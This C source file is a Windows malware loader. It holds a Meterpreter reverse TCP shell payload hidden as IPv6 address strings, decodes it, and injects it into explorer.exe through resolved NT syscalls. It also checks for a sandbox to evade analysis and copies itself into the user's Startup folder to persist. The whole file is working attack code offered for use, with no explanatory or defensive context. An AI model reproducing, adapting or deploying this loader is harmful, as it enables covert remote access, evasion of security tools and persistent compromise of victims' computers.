#include"syscalls.h"

DWORD		NtOpenProcessSSN;
UINT_PTR	sysAddrNtOpenProcess;
DWORD		NtCreateProcessSSN;
UINT_PTR	sysAddrNtCreateProcess;
DWORD		NtAllocateVirtualMemorySSN;
UINT_PTR	sysAddrNtAllocateVirtualMemory;
DWORD		NtWriteVirtualMemorySSN;
UINT_PTR	sysAddrNtWriteVirtualMemory;
DWORD		NtCreateThreadExSSN;
UINT_PTR	sysAddrNtCreateThreadEx;
DWORD		NtWaitForSingleObjectSSN;
UINT_PTR	sysAddrNtWaitForSingleObject;
DWORD		NtCloseSSN;
UINT_PTR	sysAddrNtClose;
DWORD		NtProtectVirtualMemorySSN;
UINT_PTR	sysAddrNtProtectVirtualMemory;
DWORD		NtCreateFileSSN;
UINT_PTR	sysAddrNtCreateFile;
DWORD		NtReadFileSSN;
UINT_PTR	sysAddrNtReadFile;
DWORD		NtWriteFileSSN;
UINT_PTR	sysAddrNtWriteFile;

int main(int argc, char* argv[]) {

	NTSTATUS status;
	DWORD PID = NULL;
	DWORD TID = NULL;
	PVOID rBuffer = NULL;
	HANDLE hProcess = NULL;
	HANDLE	hThread = NULL;
	HMODULE hNtDLL = NULL;

	hNtDLL = GetModuleHandleW(L"NTDLL");
	if (hNtDLL == NULL) {
		warn("Can't get handle to module Ntdll");
		return EXIT_FAILURE;
	}
	/*Check Sandbox*/
	//--Check total physical memory--//
	MEMORYSTATUSEX memstatus;
	memstatus.dwLength = sizeof(memstatus);
	DWORDLONG memstandart = 1000000000;

	if (GlobalMemoryStatusEx(&memstatus)) {
		info("Total Physical Memory: %I64u bytes", memstatus.ullTotalPhys);
		if (memstatus.ullTotalPhys <= memstandart) return EXIT_FAILURE;
	}
	else {
		warn("Error retrieving memory status. Error code: %ld", GetLastError());
		return EXIT_FAILURE;
	}

	/*-------------------Meterpreter Reverse_TCP Shell-------------------*/
	unsigned char* IPv6Shell[] = {
		"FC48:83E4:F0E8:CC00:0000:4151:4150:5248", "31D2:5165:488B:5260:5648:8B52:1848:8B52", "2048:0FB7:4A4A:488B:7250:4D31:C948:31C0", "AC3C:617C:022C:2041:C1C9:0D41:01C1:E2ED", "5241:5148:8B52:208B:423C:4801:D066:8178", "180B:020F:8572:0000:008B:8088:0000:0048",
		"85C0:7467:4801:D050:448B:4020:8B48:1849", "01D0:E356:48FF:C94D:31C9:418B:3488:4801", "D648:31C0:AC41:C1C9:0D41:01C1:38E0:75F1", "4C03:4C24:0845:39D1:75D8:5844:8B40:2449", "01D0:6641:8B0C:4844:8B40:1C49:01D0:418B", "0488:4158:4801:D041:585E:595A:4158:4159",
		"415A:4883:EC20:4152:FFE0:5841:595A:488B", "12E9:4BFF:FFFF:5D49:BE77:7332:5F33:3200", "0041:5649:89E6:4881:ECA0:0100:0049:89E5", "49BC:0200:1E61:C0A8:3880:4154:4989:E44C", "89F1:41BA:4C77:2607:FFD5:4C89:EA68:0101", "0000:5941:BA29:806B:00FF:D56A:0A41:5E50",
		"504D:31C9:4D31:C048:FFC0:4889:C248:FFC0", "4889:C141:BAEA:0FDF:E0FF:D548:89C7:6A10", "4158:4C89:E248:89F9:41BA:99A5:7461:FFD5", "85C0:740A:49FF:CE75:E5E8:9300:0000:4883", "EC10:4889:E24D:31C9:6A04:4158:4889:F941", "BA02:D9C8:5FFF:D583:F800:7E55:4883:C420",
		"5E89:F66A:4041:5968:0010:0000:4158:4889", "F248:31C9:41BA:58A4:53E5:FFD5:4889:C349", "89C7:4D31:C949:89F0:4889:DA48:89F9:41BA", "02D9:C85F:FFD5:83F8:007D:2858:4157:5968", "0040:0000:4158:6A00:5A41:BA0B:2F0F:30FF", "D557:5941:BA75:6E4D:61FF:D549:FFCE:E93C",
		"FFFF:FF48:01C3:4829:C648:85F6:75B4:41FF", "E758:6A00:59BB:E01D:2A0A:4189:DAFF:D590", "9090:9090:9090:9090:9090:9090:9090:9090"
	};

	size_t elements = sizeof(IPv6Shell) / sizeof(IPv6Shell[0]);
	size_t shellCodeSize = elements * 16;
	size_t byteWritten = 0;

	UINT_PTR pNtOpenProcess = (UINT_PTR)GetProcAddress(hNtDLL, "NtOpenProcess");
	NtOpenProcessSSN = ((unsigned char*)(pNtOpenProcess + 4))[0];
	sysAddrNtOpenProcess = pNtOpenProcess + 0x12;
	UINT_PTR pNtCreateProcess = (UINT_PTR)GetProcAddress(hNtDLL, "NtCreateProcess");
	NtCreateProcessSSN = ((unsigned char*)(pNtCreateProcess + 4))[0];
	sysAddrNtCreateProcess = pNtCreateProcess + 0x12;
	UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtDLL, "NtAllocateVirtualMemory");
	NtAllocateVirtualMemorySSN = ((unsigned char*)(pNtAllocateVirtualMemory + 4))[0];
	sysAddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;
	UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(hNtDLL, "NtWriteVirtualMemory");
	NtWriteVirtualMemorySSN = ((unsigned char*)(pNtWriteVirtualMemory + 4))[0];
	sysAddrNtWriteVirtualMemory = pNtWriteVirtualMemory + 0x12;
	UINT_PTR pNtProtectVirtualMemory = (UINT_PTR)GetProcAddress(hNtDLL, "NtProtectVirtualMemory");
	NtProtectVirtualMemorySSN = ((unsigned char*)(pNtProtectVirtualMemory + 4))[0];
	sysAddrNtProtectVirtualMemory = pNtProtectVirtualMemory + 0x12;
	UINT_PTR pNtCreateThreadEx = (UINT_PTR)GetProcAddress(hNtDLL, "NtCreateThreadEx");
	NtCreateThreadExSSN = ((unsigned char*)(pNtCreateThreadEx + 4))[0];
	sysAddrNtCreateThreadEx = pNtCreateThreadEx + 0x12;
	UINT_PTR pNtWaitForSingleObject = (UINT_PTR)GetProcAddress(hNtDLL, "NtWaitForSingleObject");
	NtWaitForSingleObjectSSN = ((unsigned char*)(pNtWaitForSingleObject + 4))[0];
	sysAddrNtWaitForSingleObject = pNtWaitForSingleObject + 0x12;
	UINT_PTR pNtClose = (UINT_PTR)GetProcAddress(hNtDLL, "NtClose");
	NtCloseSSN = ((unsigned char*)(pNtClose + 4))[0];
	sysAddrNtClose = pNtClose + 0x12;
	UINT_PTR pNtCreateFile = (UINT_PTR)GetProcAddress(hNtDLL, "NtCreateFile");
	NtCreateFileSSN = ((unsigned char*)(pNtCreateFile + 4))[0];
	sysAddrNtCreateFile = pNtCreateFile + 0x12;
	UINT_PTR pNtReadFile = (UINT_PTR)GetProcAddress(hNtDLL, "NtReadFile");
	NtReadFileSSN = ((unsigned char*)(pNtReadFile + 4))[0];
	sysAddrNtReadFile = pNtReadFile + 0x12;
	UINT_PTR pNtWriteFile = (UINT_PTR)GetProcAddress(hNtDLL, "NtWriteFile");
	NtWriteFileSSN = ((unsigned char*)(pNtWriteFile + 4))[0];
	sysAddrNtWriteFile = pNtWriteFile + 0x12;

	//-------------------------------------------------------------------------------------
	/*Try to get PID of explorer.exe*/
	char* processName = L"explorer.exe";
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		warn("failed to create snapshot");
		return EXIT_FAILURE;
	}
	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hProcessSnap, &pe32)) {
		warn("Failed to take first process");
		CloseHandle(hProcessSnap);
		return EXIT_FAILURE;
	}
	do {
		DWORD check = strcmp(pe32.szExeFile, processName);
		if (check == 0) {
			PID = pe32.th32ProcessID;
			break;
		}
	} while (Process32Next(hProcessSnap, &pe32));
	CloseHandle(hProcessSnap);

	//-------------------------------------------------------------------------------------
	if (PID == NULL) {
		warn("Failed to get PID of explorer");
		return EXIT_FAILURE;
	}

	OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
	CLIENT_ID CID = { (HANDLE)PID, NULL };
	ULONG oldProtect = NULL;

	/*INJECTION*/
	info("Try to Handle process %ld", PID);
	status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
	if (status != STATUS_SUCCESS) {
		warn("Failed to handle Process (%ld), error: 0x%x", PID, status);
		return EXIT_FAILURE;
	}
	okay("Got handle to process explorer.exe");
	info("\tHandle: 0x%p", hProcess);
	//-------------------------//---------------------------//
	status = NtAllocateVirtualMemory(hProcess, &rBuffer, NULL, &shellCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (status != STATUS_SUCCESS) {
		warn("Failed to allocate memory in process %ld, error: 0x%x", PID, status);
		status = NtClose(hProcess);
		return EXIT_FAILURE;
	}
	okay("Allocate memory Success!");

	IN6_ADDR ipv6_addr;
	INT tmp = 0;
	for (int i = 0; i < elements; i++) {
		INT check = inet_pton(AF_INET6, IPv6Shell[i], &ipv6_addr);
		status = NtWriteVirtualMemory(hProcess, (PVOID)((ULONG_PTR)rBuffer + tmp), &ipv6_addr, sizeof(ipv6_addr), &byteWritten);
		if (status != STATUS_SUCCESS) {
			warn("Failed to write shellcode to memory, error: 0x%x", status);
			status = NtClose(hProcess);
			return EXIT_FAILURE;
		}
		tmp = tmp + 16;
		byteWritten = tmp;
	}
	status = NtProtectVirtualMemory(hProcess, &rBuffer, &shellCodeSize, PAGE_EXECUTE_READ, &oldProtect);
	if (status != STATUS_SUCCESS) {
		warn("Failed to change protect type on memory, error: 0x%x", status);
		status = NtClose(hProcess);
		return EXIT_FAILURE;
	}

	status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, 0, 0, NULL);
	if (status != STATUS_SUCCESS) {
		warn("Failed to create handle to thread, error: 0x%x", status);
		status = NtClose(hProcess);
		return EXIT_FAILURE;
	}
	okay("Got handle to thread");
	info("\tHandle: 0x%p", hThread);
	status = NtWaitForSingleObject(hThread, FALSE, INFINITE);
	okay("Inject successfully!");

	/*-----------------------Clean up-----------------------*/
	info("Cleaning up ...");
	status = NtClose(hThread);
	status = NtClose(hProcess);
	okay("Finished cleanup!");

	/*PERSISTENCE*/
	/*----------------Copy to startup itself----------------*/
	wchar_t currentPath[MAX_PATH];
	DWORD length = GetModuleFileNameW(NULL, currentPath, MAX_PATH);
	char* program_name = argv[0];
	char* last_slash = strrchr(program_name, '\\');
	if (last_slash != NULL) {
		program_name = last_slash + 1;
	}
	okay("program name: %s", program_name);
	if (program_name == "WindowsStartup.exe") return EXIT_SUCCESS;
	// Check the result
	if (length > 0) {
		BOOL result = CopyFile(currentPath, L"\\??\\C:\\Users\\Admins\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\.WindowsStartup.exe", FALSE);
		okay("Copy to startup itself successfully!");
	}

	return EXIT_SUCCESS;
}